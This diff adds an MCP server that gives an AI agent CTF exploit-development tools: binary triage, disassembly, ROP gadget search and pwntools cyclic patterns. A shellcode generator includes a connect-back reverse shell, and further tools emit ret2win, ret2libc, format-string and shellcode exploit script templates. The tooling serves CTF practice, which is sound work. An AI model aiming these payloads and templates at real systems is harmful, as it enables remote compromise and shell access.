@@ -1,0 +1,503 @@
+#!/usr/bin/env python3
+"""CTF Binary Analysis & Exploit Dev MCP Server — triage, disassembly, ROP, pwntools."""
+
+import json
+import os
+import re
+import sys
+import textwrap
+
+sys.path.insert(0, os.path.dirname(__file__))
+from fastmcp import FastMCP
+from lib.subprocess_utils import parse_checksec, run_tool, safe_read_file
+
+mcp = FastMCP(
+    "ctf-binary",
+    instructions=(
+        "Binary analysis and exploit development tools for CTF challenges. "
+        "Start with binary_triage for a comprehensive overview, then use "
+        "disassemble, find_rop_gadgets, or pwntools_template as needed."
+    ),
+)
+
+
+# ── binary_triage ────────────────────────────────────────────────────────────
+
+DANGEROUS_FUNCS = {
+    "gets",
+    "scanf",
+    "sprintf",
+    "strcpy",
+    "strcat",
+    "vsprintf",
+    "realpath",
+    "getwd",
+    "streadd",
+    "strecpy",
+    "strtrns",
+}
+
+
+@mcp.tool()
+def binary_triage(path: str) -> str:
+    """Comprehensive one-shot binary analysis — runs file, checksec, rabin2 and returns structured JSON.
+
+    Provides file type, security mitigations, interesting strings, imports/exports,
+    sections, architecture, and flags dangerous functions.
+    """
+    path = os.path.realpath(path)
+    if not os.path.isfile(path):
+        return json.dumps({"error": f"File not found: {path}"})
+
+    result = {"path": path}
+
+    # file type
+    r = run_tool(["file", "-b", path])
+    result["file_type"] = r["stdout"].strip()
+
+    # checksec
+    r = run_tool(["checksec", "--file=" + path])
+    output = r["stdout"] + r["stderr"]
+    result["checksec"] = parse_checksec(output)
+
+    # rabin2 info
+    r = run_tool(["rabin2", "-I", path])
+    if r["returncode"] == 0:
+        info = {}
+        for line in r["stdout"].splitlines():
+            if "~" in line:
+                continue
+            parts = line.strip().split(None, 1)
+            if len(parts) == 2:
+                info[parts[0]] = parts[1]
+        result["arch"] = info.get("arch", "unknown")
+        result["bits"] = info.get("bits", "unknown")
+        result["endian"] = info.get("endian", "unknown")
+        result["os"] = info.get("os", "unknown")
+        result["bintype"] = info.get("bintype", "unknown")
+
+    # imports
+    r = run_tool(["rabin2", "-i", "-j", path])
+    if r["returncode"] == 0:
+        try:
+            imports_data = json.loads(r["stdout"])
+            imports = [i.get("name", "") for i in imports_data.get("imports", [])]
+            result["imports"] = imports
+            result["dangerous_functions"] = [f for f in imports if f in DANGEROUS_FUNCS]
+        except json.JSONDecodeError:
+            result["imports"] = []
+
+    # exports / symbols
+    r = run_tool(["rabin2", "-E", "-j", path])
+    if r["returncode"] == 0:
+        try:
+            exports_data = json.loads(r["stdout"])
+            result["exports"] = [
+                e.get("name", "") for e in exports_data.get("exports", [])
+            ]
+        except json.JSONDecodeError:
+            result["exports"] = []
+
+    # sections
+    r = run_tool(["rabin2", "-S", "-j", path])
+    if r["returncode"] == 0:
+        try:
+            sections_data = json.loads(r["stdout"])
+            result["sections"] = [
+                {
+                    "name": s.get("name", ""),
+                    "size": s.get("size", 0),
+                    "perm": s.get("perm", ""),
+                }
+                for s in sections_data.get("sections", [])
+            ]
+        except json.JSONDecodeError:
+            result["sections"] = []
+
+    # interesting strings
+    r = run_tool(["rabin2", "-z", "-j", path])
+    if r["returncode"] == 0:
+        try:
+            strings_data = json.loads(r["stdout"])
+            all_strings = [s.get("string", "") for s in strings_data.get("strings", [])]
+            interesting_patterns = re.compile(
+                r"flag\{|ctf\{|password|secret|/bin/sh|/bin/bash|admin|login|key|token|shell",
+                re.IGNORECASE,
+            )
+            result["strings_interesting"] = [
+                s for s in all_strings if interesting_patterns.search(s)
+            ]
+            result["strings_total"] = len(all_strings)
+        except json.JSONDecodeError:
+            pass
+
+    return json.dumps(result, indent=2)
+
+
+# ── disassemble ──────────────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def disassemble(path: str, function: str = "main", count: int = 50) -> str:
+    """Disassemble a function or address range from a binary using radare2.
+
+    Args:
+        path: Path to the binary
+        function: Function name (e.g. "main", "vuln") or address (e.g. "0x401000")
+        count: Maximum number of instructions to disassemble
+    """
+    path = os.path.realpath(path)
+    if not os.path.isfile(path):
+        return json.dumps({"error": f"File not found: {path}"})
+
+    # Use r2 in batch mode
+    if function.startswith("0x"):
+        cmd = f"s {function}; pd {count}"
+    else:
+        cmd = f"aaa; s sym.{function}; pdf"
+
+    r = run_tool(["r2", "-q", "-c", cmd, path], timeout=30)
+    if r["returncode"] != 0 and not r["stdout"].strip():
+        # Try without sym. prefix
+        cmd = f"aaa; s {function}; pdf"
+        r = run_tool(["r2", "-q", "-c", cmd, path], timeout=30)
+
+    return json.dumps(
+        {
+            "function": function,
+            "disassembly": r["stdout"].strip(),
+            "error": r.get("error", "")
+            or (r["stderr"].strip() if r["returncode"] != 0 else ""),
+        },
+        indent=2,
+    )
+
+
+# ── find_rop_gadgets ─────────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def find_rop_gadgets(
+    path: str, search: str = "", max_depth: int = 5, max_results: int = 50
+) -> str:
+    """Search for ROP gadgets in a binary using ROPgadget.
+
+    Args:
+        path: Path to the binary
+        search: Filter gadgets containing this string (e.g. "pop rdi", "ret", "syscall")
+        max_depth: Maximum gadget depth (default 5)
+        max_results: Maximum number of results to return
+    """
+    path = os.path.realpath(path)
+    if not os.path.isfile(path):
+        return json.dumps({"error": f"File not found: {path}"})
+
+    cmd = ["ROPgadget", "--binary", path, "--depth", str(max_depth)]
+    if search:
+        cmd.extend(["--only", search])
+
+    r = run_tool(cmd, timeout=60)
+    if r["returncode"] != 0:
+        return json.dumps({"error": r["stderr"] or r.get("error", "ROPgadget failed")})
+
+    gadgets = []
+    for line in r["stdout"].splitlines():
+        line = line.strip()
+        if " : " in line and line.startswith("0x"):
+            addr, _, insns = line.partition(" : ")
+            gadgets.append({"address": addr.strip(), "instructions": insns.strip()})
+
+    total = len(gadgets)
+    gadgets = gadgets[:max_results]
+
+    return json.dumps(
+        {"total_gadgets": total, "showing": len(gadgets), "gadgets": gadgets},
+        indent=2,
+    )
+
+
+# ── pattern_offset ───────────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def pattern_offset(action: str = "create", length: int = 200, value: str = "") -> str:
+    """Generate cyclic patterns or find offset from a crash value using pwntools.
+
+    Args:
+        action: "create" to generate a pattern, "find" to find offset of a value
+        length: Pattern length for creation (default 200)
+        value: The crash value to find offset for (hex like "0x41414141" or ASCII)
+    """
+    from pwn import cyclic, cyclic_find
+
+    if action == "create":
+        pattern = cyclic(length)
+        return json.dumps(
+            {
+                "pattern": pattern.decode("latin-1"),
+                "pattern_hex": pattern.hex(),
+                "length": length,
+            },
+            indent=2,
+        )
+    elif action == "find":
+        if value.startswith("0x"):
+            # Hex value — convert to bytes
+            val_int = int(value, 16)
+            val_bytes = val_int.to_bytes(4 if val_int < 0x100000000 else 8, "little")
+        else:
+            val_bytes = value.encode()
+
+        try:
+            offset = cyclic_find(val_bytes)
+            return json.dumps({"value": value, "offset": offset}, indent=2)
+        except Exception as e:
+            return json.dumps({"error": str(e)}, indent=2)
+
+    return json.dumps({"error": f"Unknown action: {action}"}, indent=2)
+
+
+# ── shellcode_generate ───────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def shellcode_generate(
+    arch: str = "amd64",
+    os_name: str = "linux",
+    payload: str = "sh",
+) -> str:
+    """Generate shellcode using pwntools shellcraft.
+
+    Args:
+        arch: Architecture — "amd64", "i386", "arm", "aarch64", "mips"
+        os_name: OS — "linux", "freebsd"
+        payload: Payload type — "sh" (spawn shell), "cat_flag" (cat flag.txt),
+                 "connect_back(host,port)" (reverse shell), "execve(path,args)"
+    """
+    import pwn
+
+    pwn.context.arch = arch
+    pwn.context.os = os_name
+
+    try:
+        if payload == "sh":
+            sc = pwn.shellcraft.sh()
+        elif payload == "cat_flag":
+            sc = pwn.shellcraft.cat("flag.txt")
+        elif payload.startswith("connect_back("):
+            args = payload[len("connect_back(") : -1].split(",")
+            host = args[0].strip().strip("'\"")
+            port = int(args[1].strip())
+            sc = pwn.shellcraft.connect(host, port) + pwn.shellcraft.dupsh()
+        elif payload.startswith("execve("):
+            args = payload[len("execve(") : -1]
+            sc = pwn.shellcraft.execve(args)
+        else:
+            sc = getattr(pwn.shellcraft, payload)()
+
+        assembled = pwn.asm(sc)
+        return json.dumps(
+            {
+                "arch": arch,
+                "os": os_name,
+                "payload": payload,
+                "assembly": sc,
+                "shellcode_hex": assembled.hex(),
+                "shellcode_escaped": "".join(f"\\x{b:02x}" for b in assembled),
+                "length": len(assembled),
+            },
+            indent=2,
+        )
+    except Exception as e:
+        return json.dumps({"error": str(e)}, indent=2)
+
+
+# ── pwntools_template ───────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def pwntools_template(
+    path: str,
+    remote: str = "",
+    technique: str = "ret2win",
+    win_function: str = "",
+) -> str:
+    """Generate a complete pwntools exploit script skeleton from binary analysis.
+
+    Args:
+        path: Path to the binary to exploit
+        remote: Remote target as "host:port" (optional)
+        technique: Exploit technique — "ret2win", "ret2libc", "rop_chain", "format_string", "shellcode"
+        win_function: Name of the win/flag function for ret2win (auto-detected if empty)
+    """
+    path = os.path.realpath(path)
+
+    # Get binary info
+    triage = json.loads(binary_triage(path))
+    arch = triage.get("arch", "x86")
+    bits = triage.get("bits", "64")
+
+    remote_parts = remote.split(":") if remote else []
+    remote_host = remote_parts[0] if len(remote_parts) == 2 else ""
+    remote_port = remote_parts[1] if len(remote_parts) == 2 else ""
+
+    # Auto-detect win function
+    if not win_function and technique == "ret2win":
+        exports = triage.get("exports", [])
+        for candidate in ["win", "flag", "shell", "get_flag", "print_flag", "secret"]:
+            if candidate in exports:
+                win_function = candidate
+                break
+        if not win_function:
+            win_function = "win  # TODO: replace with actual function name"
+
+    context_arch = "amd64" if "64" in str(bits) else "i386"
+
+    if technique == "ret2win":
+        template = textwrap.dedent(f"""\
+            #!/usr/bin/env python3
+            from pwn import *
+
+            context.arch = '{context_arch}'
+            context.log_level = 'info'
+
+            elf = ELF('{path}')
+            {"rop = ROP(elf)" if "64" in str(bits) else ""}
+
+            {"# Remote connection" if remote else "# Local process"}
+            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}
+
+            # Find the win function address
+            win_addr = elf.symbols['{win_function}']
+            log.info(f'Win function at: {{hex(win_addr)}}')
+
+            # Build payload
+            offset = 0  # TODO: find with pattern_offset tool
+            payload = b'A' * offset
+            {"payload += p64(rop.find_gadget(['ret'])[0])  # stack alignment" if "64" in str(bits) else ""}
+            payload += {"p64" if "64" in str(bits) else "p32"}(win_addr)
+
+            io.sendline(payload)
+            io.interactive()
+        """)
+
+    elif technique == "ret2libc":
+        template = textwrap.dedent(f"""\
+            #!/usr/bin/env python3
+            from pwn import *
+
+            context.arch = '{context_arch}'
+            context.log_level = 'info'
+
+            elf = ELF('{path}')
+            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # TODO: adjust path
+            rop = ROP(elf)
+
+            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}
+
+            # Stage 1: Leak libc address
+            offset = 0  # TODO: find with pattern_offset tool
+            {"pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]" if "64" in str(bits) else ""}
+            ret = rop.find_gadget(['ret'])[0]
+
+            payload = b'A' * offset
+            payload += p64(pop_rdi)
+            payload += p64(elf.got['puts'])
+            payload += p64(elf.plt['puts'])
+            payload += p64(elf.symbols['main'])  # return to main
+
+            io.sendline(payload)
+            io.recvuntil(b'\\n')  # TODO: adjust
+            leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
+            log.info(f'Leaked puts: {{hex(leak)}}')
+
+            libc.address = leak - libc.symbols['puts']
+            log.info(f'Libc base: {{hex(libc.address)}}')
+
+            # Stage 2: system("/bin/sh")
+            payload = b'A' * offset
+            payload += p64(ret)  # stack alignment
+            payload += p64(pop_rdi)
+            payload += p64(next(libc.search(b'/bin/sh\\x00')))
+            payload += p64(libc.symbols['system'])
+
+            io.sendline(payload)
+            io.interactive()
+        """)
+
+    elif technique == "format_string":
+        template = textwrap.dedent(f"""\
+            #!/usr/bin/env python3
+            from pwn import *
+
+            context.arch = '{context_arch}'
+            context.log_level = 'info'
+
+            elf = ELF('{path}')
+
+            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}
+
+            # Step 1: Find format string offset
+            # Send %p.%p.%p... to find where your input appears on stack
+            # io.sendline(b'%p.' * 20)
+
+            # Step 2: Use fmtstr_payload to write
+            offset = 0  # TODO: find the stack offset where your input starts
+            target_addr = elf.got['exit']  # TODO: what to overwrite
+            target_value = elf.symbols['win']  # TODO: what to write
+
+            payload = fmtstr_payload(offset, {{target_addr: target_value}})
+            io.sendline(payload)
+            io.interactive()
+        """)
+
+    elif technique == "shellcode":
+        template = textwrap.dedent(f"""\
+            #!/usr/bin/env python3
+            from pwn import *
+
+            context.arch = '{context_arch}'
+            context.log_level = 'info'
+
+            elf = ELF('{path}')
+
+            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}
+
+            # Generate shellcode
+            shellcode = asm(shellcraft.sh())
+            log.info(f'Shellcode length: {{len(shellcode)}}')
+
+            # Build payload
+            offset = 0  # TODO: find with pattern_offset tool
+            buf_addr = 0x0  # TODO: find writable address (use binary_triage)
+
+            payload = shellcode
+            payload += b'A' * (offset - len(shellcode))
+            payload += {"p64" if "64" in str(bits) else "p32"}(buf_addr)
+
+            io.sendline(payload)
+            io.interactive()
+        """)
+
+    else:
+        template = f"# Unknown technique: {technique}"
+
+    return json.dumps(
+        {
+            "technique": technique,
+            "binary": path,
+            "arch": context_arch,
+            "remote": remote or "local",
+            "script": template,
+            "binary_info": {
+                "checksec": triage.get("checksec", {}),
+                "dangerous_functions": triage.get("dangerous_functions", []),
+                "imports": triage.get("imports", [])[:20],
+            },
+        },
+        indent=2,
+    )
+
+
+if __name__ == "__main__":
+    mcp.run(transport="stdio")
